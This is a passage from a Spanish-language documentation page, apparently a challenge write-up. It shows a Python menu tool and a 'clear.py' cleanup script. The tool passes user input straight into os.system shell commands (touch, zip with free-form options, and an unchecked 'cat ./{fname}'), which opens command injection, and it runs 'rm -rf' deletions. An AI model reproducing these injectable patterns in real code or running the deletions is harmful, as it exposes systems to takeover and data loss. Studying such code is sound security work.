+</span><span id="__span-8-70"><a id="__codelineno-8-70" name="__codelineno-8-70"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[-] Invalid name!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;red&quot;</span><span class="p">))</span>
+</span><span id="__span-8-71"><a id="__codelineno-8-71" name="__codelineno-8-71"></a>    <span class="n">exit</span><span class="p">()</span>
+</span><span id="__span-8-72"><a id="__codelineno-8-72" name="__codelineno-8-72"></a>  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;touch </span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-8-73"><a id="__codelineno-8-73" name="__codelineno-8-73"></a>  <span class="n">contents</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Insert content: &quot;</span><span class="p">,</span> <span class="s2">&quot;yellow&quot;</span><span class="p">))</span>
+</span><span id="__span-8-74"><a id="__codelineno-8-74" name="__codelineno-8-74"></a>  <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span>
+</span><span id="__span-8-75"><a id="__codelineno-8-75" name="__codelineno-8-75"></a>  <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
+</span><span id="__span-8-76"><a id="__codelineno-8-76" name="__codelineno-8-76"></a>  <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-8-77"><a id="__codelineno-8-77" name="__codelineno-8-77"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-8-78"><a id="__codelineno-8-78" name="__codelineno-8-78"></a>  <span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Artifact [</span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s2">] was created successfuly!&quot;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">))</span>
+</span><span id="__span-8-79"><a id="__codelineno-8-79" name="__codelineno-8-79"></a>
+</span><span id="__span-8-80"><a id="__codelineno-8-80" name="__codelineno-8-80"></a><span class="k">def</span> <span class="nf">zip</span><span class="p">():</span>
+</span><span id="__span-8-81"><a id="__codelineno-8-81" name="__codelineno-8-81"></a>  <span class="n">zip_name</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;Insert &lt;name&gt;.zip: &quot;</span><span class="p">,</span> <span class="s2">&quot;blue&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span id="__span-8-82"><a id="__codelineno-8-82" name="__codelineno-8-82"></a>  <span class="n">files</span>    <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;Insert &lt;name&gt;: &quot;</span><span class="p">,</span> <span class="s2">&quot;blue&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span id="__span-8-83"><a id="__codelineno-8-83" name="__codelineno-8-83"></a>  <span class="n">options</span>  <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;Insert &lt;options&gt;: &quot;</span><span class="p">,</span> <span class="s2">&quot;blue&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span id="__span-8-84"><a id="__codelineno-8-84" name="__codelineno-8-84"></a>  <span class="k">if</span> <span class="ow">not</span> <span class="n">check_filename</span><span class="p">(</span><span class="n">zip_name</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">check_filename</span><span class="p">(</span><span class="n">files</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">check_filename</span><span class="p">(</span><span class="n">options</span><span class="p">):</span>
+</span><span id="__span-8-85"><a id="__codelineno-8-85" name="__codelineno-8-85"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[-] Invalid name!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;red&quot;</span><span class="p">))</span>
+</span><span id="__span-8-86"><a id="__codelineno-8-86" name="__codelineno-8-86"></a>    <span class="n">exit</span><span class="p">()</span>
+</span><span id="__span-8-87"><a id="__codelineno-8-87" name="__codelineno-8-87"></a>  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;zip </span><span class="si">{</span><span class="n">zip_name</span><span class="si">}</span><span class="s2">.zip </span><span class="si">{</span><span class="n">files</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">options</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-8-88"><a id="__codelineno-8-88" name="__codelineno-8-88"></a>
+</span><span id="__span-8-89"><a id="__codelineno-8-89" name="__codelineno-8-89"></a><span class="c1"># Create directory</span>
+</span><span id="__span-8-90"><a id="__codelineno-8-90" name="__codelineno-8-90"></a><span class="n">dirname</span> <span class="o">=</span> <span class="n">rand_dirname</span><span class="p">()</span>
+</span><span id="__span-8-91"><a id="__codelineno-8-91" name="__codelineno-8-91"></a><span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Directory to work in: </span><span class="si">{</span><span class="n">dirname</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;cyan&quot;</span><span class="p">))</span>
+</span><span id="__span-8-92"><a id="__codelineno-8-92" name="__codelineno-8-92"></a><span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">PATH</span> <span class="o">+</span> <span class="n">dirname</span><span class="p">)</span>
+</span><span id="__span-8-93"><a id="__codelineno-8-93" name="__codelineno-8-93"></a><span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">PATH</span> <span class="o">+</span> <span class="n">dirname</span><span class="p">)</span>
+</span><span id="__span-8-94"><a id="__codelineno-8-94" name="__codelineno-8-94"></a><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;mkdir -p Head Torso Hands Legs&quot;</span><span class="p">)</span>
+</span><span id="__span-8-95"><a id="__codelineno-8-95" name="__codelineno-8-95"></a>
+</span><span id="__span-8-96"><a id="__codelineno-8-96" name="__codelineno-8-96"></a><span class="n">ans</span> <span class="o">=</span> <span class="n">subjects</span><span class="p">()</span>
+</span><span id="__span-8-97"><a id="__codelineno-8-97" name="__codelineno-8-97"></a>
+</span><span id="__span-8-98"><a id="__codelineno-8-98" name="__codelineno-8-98"></a><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span><span id="__span-8-99"><a id="__codelineno-8-99" name="__codelineno-8-99"></a>
+</span><span id="__span-8-100"><a id="__codelineno-8-100" name="__codelineno-8-100"></a>  <span class="c1"># Choose action</span>
+</span><span id="__span-8-101"><a id="__codelineno-8-101" name="__codelineno-8-101"></a>  <span class="n">act</span> <span class="o">=</span> <span class="n">menu</span><span class="p">()</span>
+</span><span id="__span-8-102"><a id="__codelineno-8-102" name="__codelineno-8-102"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-8-103"><a id="__codelineno-8-103" name="__codelineno-8-103"></a>  <span class="k">if</span> <span class="n">act</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> 
+</span><span id="__span-8-104"><a id="__codelineno-8-104" name="__codelineno-8-104"></a>    <span class="n">create_file</span><span class="p">()</span>
+</span><span id="__span-8-105"><a id="__codelineno-8-105" name="__codelineno-8-105"></a>  <span class="k">elif</span> <span class="n">act</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+</span><span id="__span-8-106"><a id="__codelineno-8-106" name="__codelineno-8-106"></a>    <span class="nb">zip</span><span class="p">()</span>
+</span><span id="__span-8-107"><a id="__codelineno-8-107" name="__codelineno-8-107"></a>  <span class="k">elif</span> <span class="n">act</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span> 
+</span><span id="__span-8-108"><a id="__codelineno-8-108" name="__codelineno-8-108"></a>    <span class="n">fname</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Insert name you want to read: &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span id="__span-8-109"><a id="__codelineno-8-109" name="__codelineno-8-109"></a>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;cat ./</span><span class="si">{</span><span class="n">fname</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-8-110"><a id="__codelineno-8-110" name="__codelineno-8-110"></a>  <span class="k">elif</span> <span class="n">act</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span> 
+</span><span id="__span-8-111"><a id="__codelineno-8-111" name="__codelineno-8-111"></a>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;pwd; ls -la&quot;</span><span class="p">)</span>
+</span><span id="__span-8-112"><a id="__codelineno-8-112" name="__codelineno-8-112"></a>  <span class="k">elif</span> <span class="n">act</span> <span class="o">==</span> <span class="mi">6</span><span class="p">:</span>
+</span><span id="__span-8-113"><a id="__codelineno-8-113" name="__codelineno-8-113"></a>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;rm -rf ./*&quot;</span><span class="p">)</span>
+</span><span id="__span-8-114"><a id="__codelineno-8-114" name="__codelineno-8-114"></a>  <span class="k">elif</span> <span class="n">act</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span> 
+</span><span id="__span-8-115"><a id="__codelineno-8-115" name="__codelineno-8-115"></a>    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;../../</span><span class="si">{</span><span class="n">dirname</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-8-116"><a id="__codelineno-8-116" name="__codelineno-8-116"></a>    <span class="n">ans</span> <span class="o">=</span> <span class="n">subjects</span><span class="p">()</span>
+</span><span id="__span-8-117"><a id="__codelineno-8-117" name="__codelineno-8-117"></a>  <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-8-118"><a id="__codelineno-8-118" name="__codelineno-8-118"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[-] Invalid option!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;red&quot;</span><span class="p">))</span>
+</span><span id="__span-8-119"><a id="__codelineno-8-119" name="__codelineno-8-119"></a>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;rm -rf ./*&quot;</span><span class="p">)</span>
+</span><span id="__span-8-120"><a id="__codelineno-8-120" name="__codelineno-8-120"></a>    <span class="n">exit</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">clear.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-9-10">10</a></span>
+<span class="normal"><a href="#__codelineno-9-11">11</a></span>
+<span class="normal"><a href="#__codelineno-9-12">12</a></span>
+<span class="normal"><a href="#__codelineno-9-13">13</a></span>
+<span class="normal"><a href="#__codelineno-9-14">14</a></span>
+<span class="normal"><a href="#__codelineno-9-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="kn">import</span> <span class="nn">os</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls -la &gt; temp&#39;</span><span class="p">)</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;temp&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a>  <span class="n">arr</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a>  <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9"></a>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">arr</span><span class="p">[</span><span class="mi">8</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">16</span><span class="p">:</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10"></a>      <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;rm -rf </span><span class="si">{</span><span class="n">arr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span> 
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11"></a>  <span class="k">except</span><span class="p">:</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12"></a>    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13"></a>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Directories have been deleted!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15"></a><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -f ./temp&#39;</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Última actualización">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">27 de octubre de 2024</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["content.action.view", "content.code.copy", "navigation.top", "navigation.sections", "navigation.tracking", "navigation.indexes"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
